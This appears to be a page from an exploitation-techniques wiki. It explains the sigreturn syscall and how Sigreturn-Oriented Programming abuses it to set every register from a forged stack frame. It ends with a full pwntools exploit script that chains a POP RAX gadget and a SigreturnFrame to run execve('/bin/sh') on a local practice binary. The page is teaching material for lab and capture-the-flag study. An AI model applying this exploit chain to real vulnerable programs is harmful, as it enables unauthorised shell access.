## Basic Information

**`Sigreturn`** is a special **syscall** that's primarily used to clean up after a signal handler has completed its execution. Signals are interruptions sent to a program by the operating system, often to indicate that some exceptional situation has occurred. When a program receives a signal, it temporarily pauses its current work to handle the signal with a **signal handler**, a special function designed to deal with signals.

After the signal handler finishes, the program needs to **resume its previous state** as if nothing happened. This is where **`sigreturn`** comes into play. It helps the program to **return from the signal handler** and restores the program's state by cleaning up the stack frame (the section of memory that stores function calls and local variables) that was used by the signal handler.

The interesting part is how **`sigreturn`** restores the program's state: it does so by storing **all the CPU's register values on the stack.** When the signal is no longer blocked, **`sigreturn` pops these values off the stack**, effectively resetting the CPU's registers to their state before the signal was handled. This includes the stack pointer register (RSP), which points to the current top of the stack.

{% hint style="danger" %}
Calling the syscall **`sigreturn`** from a ROP chain and **adding the registry values** we would like it to load in the **stack** it's possible to **control** all the register values and therefore **call** for example the syscall `execve` with `/bin/sh`.
{% endhint %}

Note how this would be a **type of Ret2syscall** that makes much easier to control params to call other Ret2syscalls:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## Example

You can [**find an example here**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), although this is the final exploit from there:

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
